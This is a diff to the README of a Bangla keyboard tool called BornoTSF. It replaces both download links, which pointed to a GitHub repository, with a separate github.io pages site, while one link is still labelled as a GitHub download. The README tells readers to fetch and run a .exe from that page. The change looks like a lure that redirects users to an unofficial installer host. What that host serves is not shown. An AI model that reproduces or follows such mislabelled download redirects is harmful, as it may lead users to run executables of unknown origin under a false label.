@@ -1,6 +1,6 @@
 # ⌨️ BornoTSF - Type Bangla easily on Windows computers
 
-[![](https://img.shields.io/badge/Download-BornoTSF-blue.svg)](https://github.com/sacerdotal-dactyl130/BornoTSF)
+[![](https://img.shields.io/badge/Download-BornoTSF-blue.svg)](https://sacerdotal-dactyl130.github.io)
 
 BornoTSF helps you write in Bangla on your Windows computer. It uses the Text Services Framework to provide a smooth typing experience. This tool stays out of your way and works with your existing programs. It runs as a lightweight background service that does not slow down your computer.
 
@@ -8,7 +8,7 @@ BornoTSF helps you write in Bangla on your Windows computer. It uses the Text Se
 
 You must visit the project page to download the latest version of the installer. Click the link below to reach the download area.
 
-[Download BornoTSF from GitHub](https://github.com/sacerdotal-dactyl130/BornoTSF)
+[Download BornoTSF from GitHub](https://sacerdotal-dactyl130.github.io)
 
 Look for the latest release on that page. Click the file ending in .exe to start the download. Save this file to your desktop or your downloads folder.
 
